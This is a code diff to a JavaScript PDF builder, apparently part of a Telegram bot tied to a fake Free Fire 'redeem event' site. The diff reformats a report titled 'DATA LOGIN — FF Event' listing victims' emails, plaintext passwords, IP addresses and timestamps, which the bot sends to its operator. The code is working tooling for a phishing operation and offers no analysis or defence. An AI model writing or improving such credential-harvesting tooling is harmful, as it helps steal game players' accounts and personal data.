@@ -409,102 +409,135 @@ async function sendDoc(chat, fileBuffer, filename, mimeType, caption) {
   });
 }
 
-// ─── pure-JS PDF builder (no deps) ────────────────────
+// ─── pure-JS PDF builder (no deps) — Portrait A4, full width ──
 function buildPDFBuffer(logins) {
-  const W = 842, H = 595; // A4 landscape
-  const ML = 30, MR = 30, MT = 560, MB = 30;
-  const LH = 13;
+  // A4 Portrait: 595 x 842 pt
+  const W = 595, H = 842;
+  const ML = 22, MR = 22;         // margin kiri/kanan
+  const USABLE = W - ML - MR;     // 551 pt lebar bersih
+  const TOP = 800, BOT = 28;      // y awal & batas bawah
+  const LH = 17;                  // tinggi tiap baris
   const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
+  // Lebar kolom: total = 551
+  // NO(18) | HALAMAN(52) | METODE(52) | EMAIL(160) | PASSWORD(110) | IP(86) | WAKTU(73)
+  const COL_W = [18, 52, 52, 160, 110, 86, 73];
+  const COL_X = [];
+  let cx = ML;
+  COL_W.forEach(w => { COL_X.push(cx); cx += w; });
+
   function pesc(v) {
-    return String(v || '').replace(/\\/g, '\\\\').replace(/\(/g, '\\(').replace(/\)/g, '\\)').replace(/[\x00-\x1F\x7F-\xFF]/g, '?');
+    return String(v || '')
+      .replace(/\\/g, '\\\\')
+      .replace(/\(/g,  '\\(')
+      .replace(/\)/g,  '\\)')
+      .replace(/[\x00-\x1F\x80-\xFF]/g, '?');
   }
 
   const pages = [];
-  let cur = [], y = MT;
+  let cur = [], y = TOP;
 
-  function flushPage() { pages.push(cur.join('\n')); cur = []; y = MT; }
+  function flushPage() { pages.push(cur.join('\n')); cur = []; y = TOP; }
+
+  function drawRect(x, yy, w, h, r, g, b) {
+    cur.push(`${r} ${g} ${b} rg`);
+    cur.push(`${x} ${yy} ${w} ${h} re f`);
+  }
+
+  function drawText(font, size, x, yy, text) {
+    cur.push(`BT /${font} ${size} Tf ${x} ${yy} Td (${pesc(text)}) Tj ET`);
+  }
 
   function pageHeader() {
-    cur.push('0.05 0.05 0.05 rg');
-    cur.push(`${ML} ${y + 30} ${W - ML - MR} 28 re f`);
+    // ── Title bar ──────────────────────────────────────
+    drawRect(ML, y - 4, USABLE, 26, 0.07, 0.07, 0.07);
     cur.push('1 1 1 rg');
-    cur.push('BT /F1 13 Tf ' + ML + 8 + ' ' + (y + 37) + ' Td (DATA LOGIN - FF Event) Tj ET');
-    cur.push('0.9 0.9 0.9 rg');
-    cur.push('BT /F2 8 Tf ' + (W - MR - 200) + ' ' + (y + 38) + ' Td (' + pesc('Total: ' + logins.length + ' data | ' + genTime + ' WIB') + ') Tj ET');
-    cur.push('0.2 0.2 0.2 rg');
-    cur.push(`${ML} ${y + 12} ${W - ML - MR} 16 re f`);
-    cur.push('1 0.73 0 rg');
-    const cols = ['NO', 'HALAMAN', 'METODE', 'EMAIL', 'PASSWORD', 'IP', 'WAKTU'];
-    const xs   = [ML+2, ML+38, ML+100, ML+164, ML+330, ML+458, ML+542];
-    cols.forEach((c, i) => {
-      cur.push('BT /F1 7.5 Tf ' + xs[i] + ' ' + (y + 16) + ' Td (' + pesc(c) + ') Tj ET');
+    drawText('F1', 13, ML + 6, y + 5, 'DATA LOGIN — FF Event');
+    cur.push('0.8 0.8 0.8 rg');
+    drawText('F2', 7.5, ML + 330, y + 6, pesc('Total: ' + logins.length + ' data'));
+    drawText('F2', 7.5, ML + 330, y - 3, pesc(genTime + ' WIB'));
+    y -= 30;
+
+    // ── Column header ────────────────────────────────
+    drawRect(ML, y - 3, USABLE, 16, 0.15, 0.15, 0.15);
+    const hdrs = ['NO','HALAMAN','METODE','EMAIL','PASSWORD','IP','WAKTU'];
+    hdrs.forEach((h, i) => {
+      cur.push('1 0.8 0.1 rg');
+      drawText('F1', 8, COL_X[i] + 2, y + 1, h);
     });
-    cur.push('0.95 0.95 0.95 rg');
-    y -= 2;
+    y -= 17;
   }
 
   function dataRow(l, idx, rowNum) {
-    const waktu = new Date(l.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\.\d+\s/, ' ');
+    const waktu = new Date(l.ts)
+      .toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
+      .replace(/\.\d+\s/, ' ').slice(0, 19);
     const cols = [
       String(rowNum),
-      (l.page || 'redeem').toUpperCase(),
-      (l.method || '-'),
-      (l.email || '-').slice(0, 42),
-      (l.password || '-').slice(0, 24),
-      (l.ip || '-'),
-      waktu.slice(0, 18)
+      (l.page || 'redeem').toUpperCase().slice(0, 8),
+      (l.method || '-').slice(0, 8),
+      (l.email || '-').slice(0, 32),
+      (l.password || '-').slice(0, 18),
+      (l.ip || '-').slice(0, 15),
+      waktu
     ];
-    const xs = [ML+2, ML+38, ML+100, ML+164, ML+330, ML+458, ML+542];
-    const bg = idx % 2 === 0 ? '0.97 0.97 0.97' : '1 1 1';
+    // zebra stripe
+    const bg = idx % 2 === 0 ? '0.96 0.96 0.96' : '1 1 1';
     cur.push(bg + ' rg');
-    cur.push(`${ML} ${y - LH + 3} ${W - ML - MR} ${LH} re f`);
-    cur.push('0.15 0.15 0.15 rg');
+    cur.push(`${ML} ${y - LH + 5} ${USABLE} ${LH} re f`);
+    // separator line
+    cur.push('0.85 0.85 0.85 rg');
+    cur.push(`${ML} ${y - LH + 4} ${USABLE} 0.5 re f`);
+    // text
     cols.forEach((c, i) => {
-      cur.push('BT /F2 7.5 Tf ' + xs[i] + ' ' + y + ' Td (' + pesc(c) + ') Tj ET');
+      cur.push('0.1 0.1 0.1 rg');
+      drawText('F2', 8, COL_X[i] + 2, y - 9, c);
     });
     y -= LH;
   }
 
   pageHeader();
   logins.forEach((l, i) => {
-    if (y < MB + 20) { flushPage(); pageHeader(); }
+    if (y < BOT + LH + 16) { flushPage(); pageHeader(); }
     dataRow(l, i, i + 1);
   });
   // footer
-  cur.push('0.45 0.45 0.45 rg');
-  cur.push('BT /F2 7 Tf ' + ML + ' ' + (MB + 4) + ' Td (Generated by @IWX_FFBot — ' + pesc(genTime) + ' WIB) Tj ET');
+  cur.push('0.5 0.5 0.5 rg');
+  cur.push(`${ML} ${BOT - 2} ${USABLE} 0.5 re f`);
+  cur.push('0.4 0.4 0.4 rg');
+  drawText('F2', 7.5, ML, BOT + 4, pesc('Halaman ' + (pages.length + 1) + ' | Generated: ' + genTime + ' WIB'));
+  drawText('F2', 7.5, ML + 350, BOT + 4, pesc('eventfreefire.vercel.app'));
   flushPage();
 
-  // Assemble PDF objects
+  // ── Assemble PDF ──────────────────────────────────────
   const objs = [];
-  const push = (str) => { objs.push(str); return objs.length; };
+  const push  = s => { objs.push(s); return objs.length; };
   const catN  = push('');
   const pgsN  = push('');
   const f1N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>');
-  const f2N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Courier /Encoding /WinAnsiEncoding >>');
-  const resStr = '<< /Font << /F1 ' + f1N + ' 0 R /F2 ' + f2N + ' 0 R >> >>';
+  const f2N   = push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>');
+  const resStr = `<< /Font << /F1 ${f1N} 0 R /F2 ${f2N} 0 R >> >>`;
 
-  const pageNums = [];
+  const pgNums = [];
   pages.forEach(stream => {
-    const len = Buffer.byteLength(stream, 'latin1');
-    const contN = push('<< /Length ' + len + ' >>\nstream\n' + stream + '\nendstream');
-    const pgN   = push('<< /Type /Page /Parent ' + pgsN + ' 0 R /MediaBox [0 0 ' + W + ' ' + H + '] /Contents ' + contN + ' 0 R /Resources ' + resStr + ' >>');
-    pageNums.push(pgN);
+    const len   = Buffer.byteLength(stream, 'latin1');
+    const contN = push(`<< /Length ${len} >>\nstream\n${stream}\nendstream`);
+    const pgN   = push(`<< /Type /Page /Parent ${pgsN} 0 R /MediaBox [0 0 ${W} ${H}] /Contents ${contN} 0 R /Resources ${resStr} >>`);
+    pgNums.push(pgN);
   });
-  objs[catN - 1] = '<< /Type /Catalog /Pages ' + pgsN + ' 0 R >>';
-  objs[pgsN - 1] = '<< /Type /Pages /Kids [' + pageNums.map(n => n + ' 0 R').join(' ') + '] /Count ' + pageNums.length + ' >>';
+  objs[catN - 1] = `<< /Type /Catalog /Pages ${pgsN} 0 R >>`;
+  objs[pgsN - 1] = `<< /Type /Pages /Kids [${pgNums.map(n => n + ' 0 R').join(' ')}] /Count ${pgNums.length} >>`;
 
   let pdf = '%PDF-1.4\n';
   const offs = [];
-  objs.forEach((content, i) => {
+  objs.forEach((obj, i) => {
     offs.push(pdf.length);
-    pdf += (i + 1) + ' 0 obj\n' + content + '\nendobj\n';
+    pdf += `${i + 1} 0 obj\n${obj}\nendobj\n`;
   });
   const xref = pdf.length;
-  pdf += 'xref\n0 ' + (objs.length + 1) + '\n0000000000 65535 f \n';
+  pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
   offs.forEach(o => { pdf += String(o).padStart(10, '0') + ' 00000 n \n'; });
-  pdf += 'trailer\n<< /Size ' + (objs.length + 1) + ' /Root ' + catN + ' 0 R >>\nstartxref\n' + xref + '\n%%EOF\n';
+  pdf += `trailer\n<< /Size ${objs.length + 1} /Root ${catN} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
   return Buffer.from(pdf, 'latin1');
 }
 
